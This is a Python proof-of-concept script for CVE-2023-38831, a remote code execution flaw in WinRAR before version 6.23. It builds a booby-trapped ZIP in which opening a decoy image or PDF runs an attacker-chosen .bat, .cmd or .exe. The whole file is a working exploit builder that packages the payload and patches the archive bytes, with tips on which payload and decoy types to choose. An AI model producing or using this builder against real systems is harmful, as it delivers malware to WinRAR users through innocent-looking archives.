# Reference by https://github.com/z3r0sw0rd/CVE-2023-38831-PoC

# Read up by Google's TAG at:
# https://blog.google/threat-analysis-group/government-backed-actors-exploiting-winrar-vulnerability/

# Download the latest vulnerable version: 6.22 for Windows x64 at:
# https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-622.exe

import argparse
import os
import shutil
import sys

parser = argparse.ArgumentParser(description='CVE-2023-38831 is an RCE in WinRAR (<6.23)')
parser.add_argument('payload_path', help='The path of the malicious .bat, .cmd or .exe. A bat is recommended in order to run both the benign file and payload.')
parser.add_argument('benign_path', 	help='The path of the benign file, a .jpg .png or .pdf is recommended.')
args = parser.parse_args()

if not os.path.exists(args.payload_path):
    print('The file', args.payload_path, 'does not exist')
    sys.exit(1)
if not os.path.exists(args.benign_path):
	print('The file', args.benign_path, 'does not exist')
	sys.exit(2)

benign_file = os.path.basename(args.benign_path)
zip_directory = "evil_temp"

if os.path.exists(zip_directory):
	shutil.rmtree(zip_directory)
os.mkdir(zip_directory)
print('Created the directory', zip_directory)

payload_directory = os.path.join(zip_directory, benign_file + 'A')
os.mkdir(payload_directory)
print('Created the directory', payload_directory)

payload_path_dest = os.path.join(payload_directory, benign_file + 'A.cmd')
benign_path_dest = os.path.join(zip_directory, benign_file + 'B')
shutil.copyfile(args.payload_path, payload_path_dest)
shutil.copyfile(args.benign_path, benign_path_dest)
print('Copied the file from', args.payload_path, 'to', payload_path_dest)
print('Copied the file from', args.benign_path, 'to', benign_path_dest)

archive_name = 'evil'
shutil.make_archive(archive_name, 'zip', zip_directory)

with open(archive_name + '.zip', 'rb') as z:
    content = z.read()
    content = content.replace(benign_file.encode() + b'A', benign_file.encode() + b' ')
    content = content.replace(benign_file.encode() + b'B', benign_file.encode() + b' ')
os.remove(archive_name + '.zip')

with open(archive_name + '.zip', 'wb') as z:
    z.write(content)

print('Replaced the bytes in the zip file')

if os.path.exists(zip_directory):
	shutil.rmtree(zip_directory)

print('Successfully Generated the PoC as', archive_name)
